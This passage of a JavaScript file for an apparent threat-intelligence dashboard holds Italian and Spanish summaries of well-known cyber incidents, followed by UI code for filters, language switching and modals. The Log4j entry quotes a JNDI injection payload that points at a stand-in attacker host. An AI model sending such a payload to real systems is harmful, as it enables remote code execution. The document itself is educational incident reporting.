            <strong>RISOLUZIONE:</strong> Operazione internazionale delle forze dell'ordine che ha portato all'arresto di membri chiave nel Regno Unito e in Brasile. Maggiore attenzione del settore all'MFA resistente al phishing (FIDO2).
        `,
        "case-12": `
            <strong>CONTESTO:</strong> Tendenza in forte aumento di massicci furti finanziari mirati alle vulnerabilità nei protocolli Web3 e nei bridge cross-chain.<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Vulnerabilità:</strong> Errori logici negli smart contract, chiavi private dei validatori dei bridge compromesse e attacchi "flash loan" che manipolano gli oracoli di prezzo.</li>
                <li><strong>Esecuzione:</strong> Gli aggressori sfruttano bug degli smart contract per prosciugare pool di liquidità o coniare token non autorizzati.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Miliardi di dollari persi ogni anno (es. Ronin Network $625M, Poly Network $610M). Grave destabilizzazione degli ecosistemi DeFi.<br><br>
            <strong>RISOLUZIONE:</strong> Maggiore dipendenza da rigorosi audit degli smart contract, bug bounty e implementazione di reti di validatori decentralizzate.
        `,
        "case-13": `
            <strong>CONTESTO:</strong> Operazione Cronos (2024), una task force multinazionale delle forze dell'ordine che ha smantellato l'infrastruttura di LockBit, il RaaS più prolifico al mondo.<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Payload:</strong> LockBit Black (v3.0) che utilizzava crittografia rapida multi-thread e tecniche living-off-the-land (LotL).</li>
                <li><strong>Smantellamento:</strong> NCA e FBI hanno compromesso l'ambiente di amministrazione primario di LockBit, sequestrando codice sorgente, chiavi di decrittazione e dati degli affiliati.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Interruzione di migliaia di potenziali attacchi. Colpo durissimo all'ecosistema RaaS e alla fiducia degli affiliati.<br><br>
            <strong>RISOLUZIONE:</strong> Rilascio di uno strumento di decrittazione gratuito per le vittime. Incriminazioni e sanzioni contro i principali operatori LockBit a livello globale.
        `,
        "case-14": `
            <strong>CONTESTO:</strong> Scoperta nel 2024 di un attacco supply chain pluriennale altamente sofisticato mirato alla libreria di compressione dati XZ Utils (CVE-2024-3094).<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Ingegneria Sociale:</strong> Il threat actor 'Jia Tan' ha ottenuto lo status di maintainer nel corso di diversi anni attraverso contributi persistenti.</li>
                <li><strong>Payload:</strong> Backdoor offuscata iniettata nel processo di build, che modificava <code>liblzma</code> per intercettare le connessioni SSH.</li>
                <li><strong>Esecuzione:</strong> Permetteva agli aggressori di eseguire codice arbitrario via SSH utilizzando una chiave privata specifica prima dell'autenticazione.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Scongiurata una catastrofica backdoor globale nelle principali distribuzioni Linux (Debian, Ubuntu, Fedora).<br><br>
            <strong>RISOLUZIONE:</strong> Scoperta casualmente da un ingegnere Microsoft che analizzava la latenza SSH. Rollback immediato delle versioni di XZ Utils in tutte le distribuzioni Linux.
        `,
        "case-15": `
            <strong>CONTESTO:</strong> L'incombente crisi crittografica ('Q-Day') in cui i Computer Quantistici Crittograficamente Rilevanti (CRQC) violeranno l'attuale crittografia a chiave pubblica.<br><br>
            <strong>ANALISI TECNICA:</strong>
            <ul>
                <li><strong>Minaccia:</strong> L'algoritmo di Shor in esecuzione su un CRQC può fattorizzare grandi numeri primi, rendendo obsoleti RSA, ECC e Diffie-Hellman.</li>
                <li><strong>Strategia:</strong> Gli stati-nazione stanno impiegando tattiche 'Harvest Now, Decrypt Later' (HNDL), immagazzinando traffico crittografato per la decrittazione futura.</li>
            </ul><br>
            <strong>EFFETTI E IMPATTO:</strong> Compromissione totale di comunicazioni sicure, firme digitali e dati crittografati storici.<br><br>
            <strong>RISOLUZIONE:</strong> Standardizzazione NIST degli algoritmi di Post-Quantum Cryptography (PQC) (es. Kyber, Dilithium). Spinta globale per l'agilità crittografica nei sistemi aziendali.
        `
    },
    es: {
        "case-1": `
            <strong>CONTEXTO:</strong> Actor patrocinado por el estado (Corea del Norte) enfocado en financiar al régimen eludiendo sanciones internacionales mediante robos cibernéticos masivos y sustracción de criptomonedas.<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Payload:</strong> Backdoor personalizada 'Manuscrypt'.</li>
                <li><strong>Ejecución:</strong> DLL Side-loading a través de binarios legítimos firmados para eludir sistemas EDR.</li>
                <li><strong>Infraestructura C2:</strong> Red proxy multinivel para enmascarar el tráfico de exfiltración.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Cientos de millones de dólares robados a nivel mundial (ej. robo al Banco de Bangladesh, Ronin Network). Compromiso severo de plataformas DeFi.<br><br>
            <strong>RESOLUCIÓN:</strong> Mejora de los protocolos de seguridad de la red SWIFT, sanciones internacionales y congelación de criptoactivos lavados por parte de fuerzas de trabajo globales.
        `,
        "case-2": `
            <strong>CONTEXTO:</strong> Epidemia global de ransomware en mayo de 2017. Los atacantes utilizaron 'EternalBlue', un exploit supuestamente desarrollado por la NSA y filtrado por los Shadow Brokers.<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Explotación:</strong> Desbordamiento de búfer en el protocolo SMBv1 mediante paquetes manipulados.</li>
                <li><strong>Propagación:</strong> La puerta trasera DoublePulsar instaló el payload propagándolo automáticamente por redes LAN y WAN.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Más de 200.000 ordenadores infectados en 150 países. Interrupción crítica del NHS del Reino Unido, FedEx y logística global, causando miles de millones en daños.<br><br>
            <strong>RESOLUCIÓN:</strong> Un investigador (Marcus Hutchins) registró un dominio "kill-switch" incrustado en el código, deteniendo la propagación. Microsoft emitió parches de emergencia (KB4012598).
        `,
        "case-3": `
            <strong>CONTEXTO:</strong> Mayo de 2023, explotación zero-day por parte de la banda de ransomware Cl0p contra MOVEit Transfer de Progress Software, una solución de transferencia de archivos (MFT).<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Inyección:</strong> Inyección SQL no autenticada (CVE-2023-34362) en el endpoint 'moveitisapi.dll'.</li>
                <li><strong>Web Shell:</strong> Despliegue de 'human2.aspx' para manipular Azure Blob Storage.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Exfiltración de datos altamente confidenciales que afectó a más de 60 millones de personas y miles de entidades gubernamentales y corporativas en todo el mundo.<br><br>
            <strong>RESOLUCIÓN:</strong> El proveedor lanzó parches de emergencia. Las organizaciones se vieron obligadas a rotar las credenciales de cuentas de servicio, tokens SAS de Azure y auditar los registros IIS.
        `,
        "case-4": `
            <strong>CONTEXTO:</strong> Descubierto en 2010, se cree que es un arma cibernética conjunta de EE. UU. e Israel destinada a sabotear el programa de enriquecimiento nuclear de Irán.<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Zero-Days:</strong> Utilizó cuatro exploits 0-day, incluida la vulnerabilidad LNK (CVE-2010-2568).</li>
                <li><strong>Payload:</strong> Código inyectado en PLCs Siemens Simatic S7-300, alterando la velocidad de las centrífugas mientras falsificaba la telemetría normal mostrada a los operadores.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Destruyó físicamente unas 1.000 centrífugas nucleares en la instalación de Natanz, retrasando significativamente el programa nuclear. Cambió para siempre el panorama de la seguridad ICS/OT.<br><br>
            <strong>RESOLUCIÓN:</strong> El código finalmente escapó a internet. Siemens actualizó el firmware de los PLC y las industrias adoptaron estrictas arquitecturas de "air-gap" y zero-trust.
        `,
        "case-5": `
            <strong>CONTEXTO:</strong> Ataque a la cadena de suministro en julio de 2021. La banda REvil comprometió Kaseya VSA, una herramienta de monitorización remota utilizada por Proveedores de Servicios Gestionados (MSP).<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Vector:</strong> Omisión de autenticación y ejecución de comandos arbitrarios en servidores VSA.</li>
                <li><strong>Despliegue:</strong> Envió payloads maliciosos camuflados como "actualizaciones de software" legítimas, desactivando Windows Defender mediante PowerShell.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Hasta 1.500 empresas cliente cifradas a nivel mundial. Inactividad operativa masiva con una demanda de rescate inicial de 70 millones de dólares.<br><br>
            <strong>RESOLUCIÓN:</strong> Kaseya apagó los servidores SaaS inmediatamente y desplegó parches. Posteriormente, se obtuvo una clave de descifrado universal mediante operaciones policiales globales.
        `,
        "case-6": `
            <strong>CONTEXTO:</strong> Caída informática global en julio de 2024. No fue un ciberataque, sino un fallo catastrófico de control de calidad (QA) del proveedor CrowdStrike durante una actualización de su sensor.<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Error Lógico:</strong> La actualización del Channel File 291 contenía una lectura de memoria fuera de los límites (referencia a un puntero nulo).</li>
                <li><strong>Kernel Panic:</strong> Como el sensor Falcon opera en el Ring 0 (Kernel), la lectura inválida provocó un BugCheck inmediato.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> 8,5 millones de dispositivos Windows entraron en un bucle de pantalla azul de la muerte (BSOD). Vuelos cancelados a nivel mundial, operaciones bancarias detenidas y hospitales interrumpidos.<br><br>
            <strong>RESOLUCIÓN:</strong> Requirió intervención manual (arrancar en Modo Seguro para eliminar el archivo .sys dañado). Posteriormente, CrowdStrike revisó por completo sus procedimientos de pruebas y despliegue escalonado.
        `,
        "case-7": `
            <strong>CONTEXTO:</strong> Ataque a la cadena de suministro en 2020 (atribuido al SVR ruso). Se infiltró en el proceso de compilación de la plataforma SolarWinds Orion.<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Backdoor:</strong> Código malicioso 'SUNBURST' inyectado en la DLL legítima 'SolarWinds.Orion.Core.BusinessLayer.dll'.</li>
                <li><strong>Técnica:</strong> Ataques 'Golden SAML' para falsificar tokens de autenticación y evadir MFA, moviéndose lateralmente a entornos en la nube.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Compromiso de docenas de agencias gubernamentales de EE. UU. y empresas de Fortune 500. Exfiltración no detectada durante más de 9 meses.<br><br>
            <strong>RESOLUCIÓN:</strong> Reconstrucción total de las redes para las entidades afectadas. Directivas de emergencia de CISA que obligan a desconectar las instancias de Orion.
        `,
        "case-8": `
            <strong>CONTEXTO:</strong> Descubrimiento a finales de 2021 de una RCE crítica en la omnipresente biblioteca de registro de Java Apache Log4j (CVE-2021-44228).<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Mecanismo:</strong> Inyección JNDI a través de búsquedas LDAP/RMI en cadenas de registro.</li>
                <li><strong>Exploit:</strong> El atacante envía un payload como <code>\${jndi:ldap://attacker.com/a}</code> para desencadenar la ejecución remota de código sin autenticación.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Afectó a miles de millones de dispositivos empresariales y servicios en la nube (AWS, iCloud, Steam). Escaneo masivo y explotación inmediata por parte de actores de amenazas.<br><br>
            <strong>RESOLUCIÓN:</strong> Parches de emergencia a nivel mundial a Log4j 2.17.1+. Implementación generalizada de reglas WAF para bloquear patrones de búsqueda JNDI.
        `,
        "case-9": `
            <strong>CONTEXTO:</strong> Software espía avanzado zero-click desarrollado por NSO Group, utilizado ampliamente para la vigilancia de periodistas, activistas y líderes mundiales.<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Vector:</strong> Exploits zero-click dirigidos a iMessage (FORCEDENTRY - CVE-2021-30860) y WhatsApp.</li>
                <li><strong>Exploit:</strong> PDF malformado que utiliza compresión JBIG2 para desencadenar un desbordamiento de enteros en CoreGraphics.</li>
                <li><strong>Capacidad:</strong> Acceso completo al micrófono, la cámara, el GPS y los mensajes cifrados (eludiendo el cifrado de extremo a extremo).</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Violaciones globales de los derechos humanos. Importantes repercusiones diplomáticas y exposición de extensos programas de vigilancia estatal.<br><br>
            <strong>RESOLUCIÓN:</strong> Apple y Google implementaron defensas avanzadas a nivel de hardware (por ejemplo, el Modo de aislamiento). NSO Group fue incluida en la Lista de entidades de EE. UU.
        `,
        "case-10": `
            <strong>CONTEXTO:</strong> Ataque de ransomware en mayo de 2021 por parte del grupo DarkSide dirigido al mayor oleoducto de combustible de los Estados Unidos.<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Entrada:</strong> Credenciales de cuenta VPN heredadas comprometidas (descubiertas en filtraciones de datos anteriores) que carecían de MFA.</li>
                <li><strong>Cifrado:</strong> Sistemas de TI y facturación afectados, lo que obligó a un cierre operativo proactivo de la red OT para evitar la propagación.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Compras de pánico y escasez de combustible en toda la costa este de EE. UU. La empresa pagó un rescate de 4,4 millones de dólares en Bitcoin.<br><br>
            <strong>RESOLUCIÓN:</strong> El FBI recuperó con éxito una parte importante del rescate. Emisión de órdenes ejecutivas de EE. UU. que exigen normas de seguridad de oleoductos más estrictas.
        `,
        "case-11": `
            <strong>CONTEXTO:</strong> Grupo de actores de amenazas adolescentes altamente capacitados que vulneraron con éxito a importantes corporaciones tecnológicas utilizando ingeniería social agresiva.<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Vector:</strong> Intercambio de SIM (SIM swapping), compra de tokens de sesión y soborno de empleados.</li>
                <li><strong>Ejecución:</strong> Ataques de fatiga de MFA (envío masivo de solicitudes de 2FA hasta que el usuario aprueba) e ingeniería social a la mesa de ayuda para obtener acceso inicial.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Exfiltración de código fuente patentado de NVIDIA, Microsoft (Bing/Cortana), Samsung y Okta.<br><br>
            <strong>RESOLUCIÓN:</strong> Operación policial internacional que condujo al arresto de miembros clave en el Reino Unido y Brasil. Mayor enfoque de la industria en la MFA resistente al phishing (FIDO2).
        `,
        "case-12": `
            <strong>CONTEXTO:</strong> Tendencia creciente de robos financieros masivos dirigidos a vulnerabilidades en protocolos Web3 y puentes entre cadenas (cross-chain bridges).<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Vulnerabilidades:</strong> Errores lógicos en contratos inteligentes, claves privadas de validadores de puentes comprometidas y ataques de préstamos rápidos (flash loans) que manipulan oráculos de precios.</li>
                <li><strong>Ejecución:</strong> Los atacantes explotan errores de contratos inteligentes para vaciar fondos de liquidez o acuñar tokens no autorizados.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Miles de millones de dólares perdidos anualmente (ej. Ronin Network $625M, Poly Network $610M). Grave desestabilización de los ecosistemas DeFi.<br><br>
            <strong>RESOLUCIÓN:</strong> Mayor dependencia de auditorías rigurosas de contratos inteligentes, programas de recompensas por errores (bug bounties) e implementación de redes de validadores descentralizadas.
        `,
        "case-13": `
            <strong>CONTEXTO:</strong> Operación Cronos (2024), un grupo de trabajo multinacional encargado de hacer cumplir la ley que desmanteló la infraestructura de LockBit, el RaaS más prolífico del mundo.<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Payload:</strong> LockBit Black (v3.0) que utiliza un cifrado rápido de subprocesos múltiples y técnicas de "living-off-the-land" (LotL).</li>
                <li><strong>Desmantelamiento:</strong> La NCA y el FBI comprometieron el entorno de administración principal de LockBit, incautando el código fuente, las claves de descifrado y los datos de los afiliados.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Interrupción de miles de ataques potenciales. Golpe masivo al ecosistema RaaS y a la confianza de los afiliados.<br><br>
            <strong>RESOLUCIÓN:</strong> Lanzamiento de una herramienta de descifrado gratuita para las víctimas. Acusaciones y sanciones contra los principales operadores de LockBit a nivel mundial.
        `,
        "case-14": `
            <strong>CONTEXTO:</strong> Descubrimiento en 2024 de un ataque de cadena de suministro de varios años altamente sofisticado dirigido a la biblioteca de compresión de datos XZ Utils (CVE-2024-3094).<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Ingeniería Social:</strong> El actor de amenazas 'Jia Tan' obtuvo el estado de mantenedor durante varios años a través de contribuciones persistentes.</li>
                <li><strong>Payload:</strong> Puerta trasera ofuscada inyectada en el proceso de compilación, modificando <code>liblzma</code> para interceptar conexiones SSH.</li>
                <li><strong>Ejecución:</strong> Permitía a los atacantes ejecutar código arbitrario a través de SSH utilizando una clave privada específica antes de la autenticación.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Evitó una puerta trasera global catastrófica en las principales distribuciones de Linux (Debian, Ubuntu, Fedora).<br><br>
            <strong>RESOLUCIÓN:</strong> Descubierto accidentalmente por un ingeniero de Microsoft que analizaba la latencia de SSH. Reversión inmediata de las versiones de XZ Utils en todas las distribuciones de Linux.
        `,
        "case-15": `
            <strong>CONTEXTO:</strong> La inminente crisis criptográfica ('Q-Day') en la que las computadoras cuánticas criptográficamente relevantes (CRQC) romperán la criptografía de clave pública actual.<br><br>
            <strong>ANÁLISIS TÉCNICO:</strong>
            <ul>
                <li><strong>Amenaza:</strong> El algoritmo de Shor que se ejecuta en un CRQC puede factorizar números primos grandes, haciendo que RSA, ECC y Diffie-Hellman queden obsoletos.</li>
                <li><strong>Estrategia:</strong> Los estados-nación están empleando tácticas 'Harvest Now, Decrypt Later' (HNDL), almacenando tráfico cifrado para su futura descifrado.</li>
            </ul><br>
            <strong>IMPACTO Y EFECTOS:</strong> Compromiso total de comunicaciones seguras, firmas digitales y datos cifrados históricos.<br><br>
            <strong>RESOLUCIÓN:</strong> Estandarización del NIST de algoritmos de criptografía poscuántica (PQC) (ej. Kyber, Dilithium). Impulso global para la agilidad criptográfica en los sistemas empresariales.
        `
    }
};

document.addEventListener('DOMContentLoaded', () => {
    // 1. GESTIONE FILTRI
    const filterButtons = document.querySelectorAll('.filter-btn');
    const cards = document.querySelectorAll('.intel-card');

    filterButtons.forEach(btn => {
        btn.addEventListener('click', () => {
            filterButtons.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');

            const filterValue = btn.getAttribute('data-key');

            cards.forEach(card => {
                const category = card.getAttribute('data-category');
                if (filterValue === 'filter_all' || 
                   (filterValue === 'filter_apt' && category === 'apt_groups') || 
                   (filterValue === 'filter_vuln' && category === 'vulnerabilities')) {
                    card.style.display = 'flex';
                } else {
                    card.style.display = 'none';
                }
            });
        });
    });

    // 2. GESTIONE LINGUA
    const langButtons = document.querySelectorAll('.lang-btn');
    langButtons.forEach(button => {
        button.addEventListener('click', () => {
            const lang = button.getAttribute('data-lang');
            langButtons.forEach(btn => btn.classList.remove('active'));
            button.classList.add('active');

            // Traduci elementi UI
            document.querySelectorAll('[data-key]').forEach(element => {
                const key = element.getAttribute('data-key');
                if (translations[lang][key]) {
                    element.textContent = translations[lang][key];
                }
            });
            
            // Aggiorna anche il contenuto del modal se è aperto
            const modal = document.getElementById('report-modal');
            if (modal.classList.contains('active')) {
                const currentCardId = modal.getAttribute('data-current-card');
                document.getElementById('modal-content').innerHTML = reportDetails[lang][currentCardId];
            }
        });
    });

    // 3. GESTIONE MODAL (REPORT COMPLETI)
    const modal = document.getElementById('report-modal');
    const closeBtn = document.querySelector('.modal-close');
    const overlay = document.querySelector('.modal-overlay');
    const reportsArchive = document.querySelector('.reports-archive'); // Seleziona il contenitore corretto

    document.querySelectorAll('.view-report-btn').forEach(button => {
        button.addEventListener('click', (e) => {
            e.preventDefault(); // Previene il comportamento del link se presente
            const card = e.target.closest('.intel-card');
            const caseId = card.querySelector('.case-id').textContent;
            const caseTitle = card.querySelector('h3').textContent;
            const cardId = card.id;
            const currentLang = document.querySelector('.lang-btn.active').getAttribute('data-lang');

            // Popola Modal
            document.getElementById('modal-case-id').textContent = caseId;
            document.getElementById('modal-title').textContent = caseTitle;
            document.getElementById('modal-content').innerHTML = reportDetails[currentLang][cardId] || "Content under decryption...";
            
            // Salva l'ID della card attiva nel modal (serve per la traduzione in tempo reale)
            modal.setAttribute('data-current-card', cardId);

            // Mostra Modal
            modal.classList.add('active');
            // Blocca lo scroll solo sulla griglia, non sul body
            if (reportsArchive) reportsArchive.style.overflowY = 'hidden'; 
        });
    });

    // Chiusura Modal Report
    const closeModal = () => {
        modal.classList.remove('active');
        // Ripristina lo scroll sulla griglia
        if (reportsArchive) reportsArchive.style.overflowY = 'auto';
    };

    closeBtn.addEventListener('click', closeModal);
    overlay.addEventListener('click', closeModal);

    // 4. GESTIONE CARICAMENTO (OVERLAY)
    const loadingOverlay = document.getElementById('loading-overlay');
    if(loadingOverlay) {
        setTimeout(() => {
            loadingOverlay.classList.add('hidden');
        }, 1800);
    }
    
    // 5. GESTIONE MODALE CVE DATABASE (NUOVO)
    const cveBtn = document.getElementById('open-cve-db');
    const cveModal = document.getElementById('cve-modal');
    
    if (cveBtn && cveModal) {
        const cveCloseBtn = cveModal.querySelector('.cve-close');
        const cveOverlay = cveModal.querySelector('.modal-overlay');

        cveBtn.addEventListener('click', () => {
            cveModal.classList.add('active');
            if (reportsArchive) reportsArchive.style.overflowY = 'hidden'; // Blocca scroll griglia
        });

        const closeCveModal = () => {
            cveModal.classList.remove('active');
            if (reportsArchive) reportsArchive.style.overflowY = 'auto'; // Ripristina scroll griglia
        };

        if (cveCloseBtn) cveCloseBtn.addEventListener('click', closeCveModal);
        if (cveOverlay) cveOverlay.addEventListener('click', closeCveModal);
    }
});